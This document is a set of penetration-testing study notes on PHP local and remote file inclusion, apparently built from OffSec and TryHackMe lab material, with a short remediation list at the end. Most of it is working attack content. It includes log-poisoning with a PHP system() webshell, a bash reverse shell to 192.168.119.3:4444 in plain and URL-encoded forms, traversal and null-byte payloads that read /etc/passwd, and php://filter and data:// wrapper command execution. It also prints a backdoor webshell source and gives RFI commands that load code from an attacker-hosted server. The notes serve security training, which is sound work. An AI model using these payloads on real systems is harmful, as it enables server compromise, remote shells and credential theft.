# File inclusion

## Local File Inclusion

### Log poisoning

curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log

Insert php code in the User Agent string

```
<?php echo system($_GET['cmd']); ?>
```

```
../../../../../../../../../var/log/apache2/access.log&cmd=ps
../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la
```

```
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```

Since we'll execute our command through the PHP _system_ function, we should be aware that the command may be executed via the _Bourne Shell_,[9](https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/local-file-inclusion-lfi#fn9) also known as _sh_, rather than Bash. The reverse shell one-liner in Listing 16 contains syntax that is not supported by the Bourne Shell. To ensure the reverse shell is executed via Bash, we need to modify the reverse shell command. We can do this by providing the reverse shell one-liner as argument to **bash -c**, which executes a command with Bash.

```
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

We'll once again encode the special characters with URL encoding.

```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

> #### Windows
>
> For example, on a target running _XAMPP_ the Apache logs can be found in **C:\xampp\apache\logs\\**.
>
> GET /meteor/index.php?page=....................\xampp\apache\logs\access.log\&cmd=dir
>
>

## LFI bypass with NULL BYTE

Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.

```
lab3.php?file=../../../../../etc/passwd%00
lab4.php?file=/etc/passwd/.
...//....//....//....//....//etc/passwd
lab6.php?file=THM-profile/../../../../etc/os-release/. ###including a folder
```

{% hint style="info" %}
NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.
{% endhint %}

## PHP Wrapers

### php://filter

{% code title="Contents of the admin.php file" overflow="wrap" lineNumbers="true" %}
```
curl http://mountaindesserts.com/meteor/index.php?page=admin.php
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
```
{% endcode %}

### data://

{% code title="Usage of the "data://" wrapper with base64 encoded data" overflow="wrap" lineNumbers="true" %}
```
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```
{% endcode %}

This is a handy technique that may help us bypass basic filters. However, we need to be aware that the **data://** wrapper will not work in a default PHP installation. To exploit it, the _allow\_url\_include_ setting needs to be enabled.

##

### PHP Filter thm

The PHP filter wrapper is used in LFI to read the actual PHP page content. In typical cases, it is not possible to read a PHP file's content via LFI because PHP files get executed and never show the existing code. However, we can use the PHP filter to display the content of PHP files in other encoding formats such as base64 or ROT13.&#x20;

Let's try first reading the /etc/passwd file using the PHP filter wrapper.

```scheme
  http://example.thm.labs/page.php?file=php://filter/resource=/etc/passwd
```

Now try to read the index.php file using a PHP filter; we get errors because the web server tries to execute the PHP code. To avoid this, we can use a PHP filter while base64 or ROT13 encoding the output as follows:

```scheme
http://example.thm.labs/page.php?file=filter/read=string.rot13/resource=/etc/passwd http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
```

We will try to use base64 for our scenario. As a result, we will get base64 encoded output as follows:

```scheme
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDox******Deleted
```

```
LFI to get pfpinfo
curl -A "<?php phpinfo();?>" http://10-10-253-145.p.thmlabs.com/login.php
LFI to get hostname
curl -A "<?php echo php_uname();?>" http://10.10.253.145/login.php
```

## Remote File Inclusion - RFI

In PHP web applications, for example, the **allow\_url\_include** option needs to be enabled to leverage RFI, just as with the **data://** wrapper

Kali Linux includes several PHP _webshells_ in the **/usr/share/webshells/php/** directory that can be used for RFI.

{% code title="Location and contents of the simple-backdoor.php webshell" overflow="wrap" lineNumbers="true" %}
```
kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
...
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
...
```
{% endcode %}

{% code title="Starting the Python3 http.server module" overflow="wrap" lineNumbers="true" %}
```
python3 -m http.server 80
```
{% endcode %}

{% code title="Exploiting RFI with a PHP backdoor and execution of ls" overflow="wrap" lineNumbers="true" %}
```
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```
{% endcode %}

### THM

Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the allow\_url\_fopen option needs to be on.

The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:

* Sensitive Information Disclosure
* Cross-site Scripting (XSS)
* Denial of Service (DoS)

```
http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
```

## Remediation

1. bKeep system and services, including web application frameworks, updated with the latest version.
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow\_url\_fopen on and allow\_url\_include.
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
6. Never trust user input, and make sure to implement proper input validation against file inclusion.
7. Implement whitelisting for file names and locations as well as blacklisting.
